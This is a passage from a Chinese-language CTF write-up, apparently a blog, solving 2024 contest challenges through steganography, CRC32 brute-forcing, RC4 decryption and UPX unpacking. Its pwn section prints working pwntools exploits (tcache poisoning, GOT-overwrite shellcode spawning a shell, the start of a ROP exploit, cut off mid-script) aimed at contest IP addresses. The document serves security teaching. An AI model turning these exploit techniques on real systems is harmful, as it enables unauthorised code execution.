class="hljs-string">&#x27;1&#x27;</span>).getdata()<br>        <span class="hljs-keyword">if</span> (d[<span class="hljs-number">0</span>]==<span class="hljs-number">0</span>):<br>            data+=<span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            data+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(data)==<span class="hljs-number">8</span>):<br>        e.append(<span class="hljs-built_in">int</span>(data,<span class="hljs-number">2</span>))<br>        data=<span class="hljs-string">&#x27;&#x27;</span><br>    n+=<span class="hljs-number">1</span><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>identify查看帧间隔，发现前几帧的间隔不一致，提取出来转成字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lewiserii:~# identify -format <span class="hljs-string">&quot;%s %T \n&quot;</span> 2.gif<br>0 118<br>1 106<br>2 69<br>3 74<br>4 48<br>5 98<br>6 83<br>7 117<br>8 77<br>9 79<br>10 86<br>11 65<br>12 90<br>13 103<br>14 101<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">118</span>,<span class="hljs-number">106</span>,<span class="hljs-number">69</span>,<span class="hljs-number">74</span>,<span class="hljs-number">48</span>,<span class="hljs-number">98</span>,<span class="hljs-number">83</span>,<span class="hljs-number">117</span>,<span class="hljs-number">77</span>,<span class="hljs-number">79</span>,<span class="hljs-number">86</span>,<span class="hljs-number">65</span>,<span class="hljs-number">90</span>,<span class="hljs-number">103</span>,<span class="hljs-number">101</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br><br><span class="hljs-comment">#b&#x27;vjEJ0bSuMOVAZge&#x27;</span><br></code></pre></td></tr></table></figure><p>解压得到flag <code>DASCTF&#123;H3r3_1s_C0L0rful_W0rld&#125;</code></p><h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><p>按照黑猴的章节名排序</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">火照黑云<br>风起黄昏<br>夜生白露<br>曲度紫鸳<br>日落红尘<br>未竟<br></code></pre></td></tr></table></figure><p>发现按照顺序取一个字节是<code>50 4b 03 04 00 0a</code></p><p>python提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">file_list = [<span class="hljs-string">&#x27;火照黑云&#x27;</span>, <span class="hljs-string">&#x27;风起黄昏&#x27;</span>, <span class="hljs-string">&#x27;夜生白露&#x27;</span>, <span class="hljs-string">&#x27;曲度紫鸳&#x27;</span>, <span class="hljs-string">&#x27;日落红尘&#x27;</span>, <span class="hljs-string">&#x27;未竟&#x27;</span>]<br>sources = [<span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">for</span> file_name <span class="hljs-keyword">in</span> file_list]<br>n = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> target:<br>    <span class="hljs-keyword">while</span> n &lt; <span class="hljs-number">0x5ead4</span>:<br>        bytes_read = [source.read(<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> source <span class="hljs-keyword">in</span> sources]<br><br>        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> bytes_read:<br>            <span class="hljs-keyword">if</span> byte:<br>                target.write(byte)<br>        n += <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>7-zip打开可以看到另一个zip</p><p><img src="/img/wp/2024/2024-zjss-js-%E5%A4%A9%E5%91%BD%E4%BA%BA-1.png"></p><p>其中 根器.zip 很明显进行crc32爆破</p><p><img src="/img/wp/2024/2024-zjss-js-%E5%A4%A9%E5%91%BD%E4%BA%BA-2.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x76899D01<br>4 bytes: C0M3 &#123;0x43, 0x30, 0x4d, 0x33&#125;<br>verification checksum: 0x76899d01 (OK)<br><br><br>C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x8E036AA6<br>4 bytes: _4ND &#123;0x5f, 0x34, 0x4e, 0x44&#125;<br>verification checksum: 0x8e036aa6 (OK)<br><br><br>C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x881D716A<br>4 bytes: _Get &#123;0x5f, 0x47, 0x65, 0x74&#125;<br>verification checksum: 0x881d716a (OK)<br><br><br>C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x7F3D8E75<br>4 bytes: _S1X &#123;0x5f, 0x53, 0x31, 0x58&#125;<br>verification checksum: 0x7f3d8e75 (OK)<br><br><br>C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0x248D3C69<br>4 bytes: _R00 &#123;0x5f, 0x52, 0x30, 0x30&#125;<br>verification checksum: 0x248d3c69 (OK)<br><br><br>C:\Users\lewiserii\Desktop\脚本\crc32碰撞\压缩包crc32爆破&gt;python crc32.py reverse 0xCB27D2BD<br>4 bytes: TS!! &#123;0x54, 0x53, 0x21, 0x21&#125;<br>verification checksum: 0xcb27d2bd (OK)<br></code></pre></td></tr></table></figure><p>得到密码<code>C0M3_4ND_Get_S1X_R00TS!!</code>，解密 未竟.zip</p><p>提取<code>金箍棒.png</code>上的像素点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;金箍棒.png&quot;</span>)<br>x, y = <span class="hljs-number">5</span>, <span class="hljs-number">5</span><br>x_, y_ = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>w, h = a.size<br>b = Image.new(a.mode, (w // <span class="hljs-number">10</span>, h // <span class="hljs-number">10</span>))<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, w, <span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, h, <span class="hljs-number">10</span>):<br>        <span class="hljs-built_in">print</span>(x, y, x_, y_)<br>        b.putpixel((x_, y_), a.getpixel((x, y)))<br>        y_ += <span class="hljs-number">1</span><br>    x_ += <span class="hljs-number">1</span><br>    y_ = <span class="hljs-number">0</span><br>b.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到<code>verapass1:jinggubang</code></p><p><img src="/img/wp/2024/2024-zjss-js-%E5%A4%A9%E5%91%BD%E4%BA%BA-3.png"></p><p>用照片作为密钥文件同时使用密码挂载得到flag</p><p><img src="/img/wp/2024/2024-zjss-js-%E5%A4%A9%E5%91%BD%E4%BA%BA-4.png"></p><p><code>DASCTF&#123;T1m3_t0_F4Ce_De5t1nY&#125;</code></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Reverse2"><a href="#Reverse2" class="headerlink" title="Reverse2"></a>Reverse2</h2><p><code>upx</code> 加密，但抹了特征，修改一下就行</p><p><img src="/img/wp/2024/2024-zjss-js-Reverse2-1.png"></p><p>然后用命令解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">upx -d Reverse2.exe<br></code></pre></td></tr></table></figure><p>打开就是 <code>base64</code> 换表</p><p><img src="/img/wp/2024/2024-zjss-js-Reverse2-2.png"></p><h2 id="Reverse1"><a href="#Reverse1" class="headerlink" title="Reverse1"></a>Reverse1</h2><p>先使用标准rc4加密密钥<br>之后使用魔改的rc4加密明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">rc4</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toBytes</span>(<span class="hljs-params">self,data</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">str</span>:<br>            <span class="hljs-keyword">return</span> data.encode()<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">return</span> data<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;data Type Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">self,data</span>):<br>        k=[]<br>        k1=[]<br>        data_l=<span class="hljs-built_in">len</span>(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            k.append(i)<br>            k1.append(data[i%data_l])<br>        n=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            n=(k1[i]+n+k[i])&amp;<span class="hljs-number">0xff</span><br>            n1=k[i]<br>            k[i]=k[n]<br>            k[n]=n1<br>        <span class="hljs-keyword">return</span> k<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">self,data</span>):<br>        data=<span class="hljs-variable language_">self</span>.toBytes(data)<br>        enc=[]<br>        k=<span class="hljs-variable language_">self</span>.Key.copy()<br>        n=<span class="hljs-number">0</span><br>        n1=<span class="hljs-number">0</span><br>        tmp=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>            n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>            n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>            tmp=k[n]<br>            k[n]=k[n1]<br>            k[n1]=tmp<br>            enc.append((data[i]+k[(k[n]+k[n1])%<span class="hljs-number">256</span>])&amp;<span class="hljs-number">0xff</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,key</span>):<br>        key=<span class="hljs-variable language_">self</span>.toBytes(key)<br>        <span class="hljs-variable language_">self</span>.Key=<span class="hljs-variable language_">self</span>.GetKey(key)<br>        <span class="hljs-variable language_">self</span>.__Key=key<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SetKey</span>(<span class="hljs-params">self,key</span>):<br>        key=<span class="hljs-variable language_">self</span>.toBytes(key)<br>        <span class="hljs-variable language_">self</span>.Key=<span class="hljs-variable language_">self</span>.GetKey(key)<br>        <span class="hljs-variable language_">self</span>.__Key=key<br><br><br>k=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;690d5ab240ea193f2f6a&quot;</span>)<br>d=[<span class="hljs-number">0x4E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xCF</span>]<br>r=rc4(<span class="hljs-built_in">bytes</span>(k))<br>e=r.Cipher(<span class="hljs-built_in">bytes</span>(d))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezPwn"><a href="#ezPwn" class="headerlink" title="ezPwn"></a>ezPwn</h2><p>直接利用<code>tcache bin</code>在<code>0x4180</code>地址处创建<code>chunk</code>，并写入构造好的数据，就可以获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size&gt;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">&quot;data&gt;&gt;&quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendafter(<span class="hljs-string">&quot;data&gt;&gt;&quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.readuntil(<span class="hljs-string">b&#x27;data&gt;&gt;\n&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">pass</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&#x27;10.1.197.36&#x27;</span>,<span class="hljs-number">9999</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;gift:\n&#x27;</span>)<br>e.address=<span class="hljs-built_in">int</span>(p.readline(),<span class="hljs-number">16</span>)-<span class="hljs-number">0x1a44</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x400</span>)<br>add(<span class="hljs-number">0x400</span>)<br>add(<span class="hljs-number">0x400</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>d=calc(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>_4180=e.address+<span class="hljs-number">0x4180</span><br><br>edit(<span class="hljs-number">1</span>,p64(_4180^((d+<span class="hljs-number">0x410</span>)&gt;&gt;<span class="hljs-number">12</span>)))<br>add(<span class="hljs-number">0x400</span>)<br>add(<span class="hljs-number">0x400</span>)<br>add(<span class="hljs-number">0x400</span>)<br>payload=p32(<span class="hljs-number">0xf0</span>)*<span class="hljs-number">10</span><br>edit(<span class="hljs-number">5</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;6&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="printFFF"><a href="#printFFF" class="headerlink" title="printFFF"></a>printFFF</h2><p>题目允许写入0x15字节的shellcode，但是不够获取shell<br>所以利用<code>exit</code>的<code>got</code>表第二次写shellcode，并在第一次shellcode中设置一些环境<br>这样第二次shellcode就可以直接调用<code>system(&quot;sh&quot;)</code>来获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov edi,0x404800</span><br><span class="hljs-string">mov eax,0x6873</span><br><span class="hljs-string">mov [rdi],rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">sub rdi,0x6D</span><br><span class="hljs-string">jmp rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shellop=asm(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellop)))<br><span class="hljs-comment">#exit()</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&quot;10.1.197.38&quot;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x4010E0&#x27;)</span><br><br>p.send(shellop)<br>pause()<br>exit_=e.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>p.send(p64(<span class="hljs-number">0x405000</span>)+p64(exit_)+p64(<span class="hljs-number">4</span>))<br>p.interactive()<br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov edi,0x404800</span><br><span class="hljs-string">mov rax,[0x404030]</span><br><span class="hljs-string">sub rax,0xc3a60</span><br><span class="hljs-string">jmp rax</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shellop=asm(shellcode)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellop)))<br><br>p.send(shellop)<br>pause()<br>exit_=e.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>p.send(p64(<span class="hljs-number">0x405000</span>)+p64(exit_)+p64(<span class="hljs-number">4</span>))<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="reverse-stack"><a href="#reverse-stack" class="headerlink" title="reverse_stack"></a>reverse_stack</h2><p>在程序扩展栈空间的时候存在整数溢出，让下一个函数的栈在当前函数的前面，就可以实现修改程序流<br>通过修改程序流让程序第二次使用mmap创建第二个栈<br>这两个栈是连续的，这样在第一次调用函数时写入的栈地址就在程序栈的中间，就可以获取栈中的数据，比如libc_start_main的地址<br>之后就可以构造rop链获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">l</span>(<span class="hljs-params">size</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;long?\n&#x27;</span>,p64(size&amp;(<span class="hljs-number">0xffffffffffffffff</span>)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">d</span>(<span class="hljs-params">data</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;buf\n&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pill</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n:<br>        p.sendafter(<span class="hljs-string">&#x27;pill?\n&#x27;</span>,<span class="hljs-string">b&#x27;red&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        p.sendafter(<span 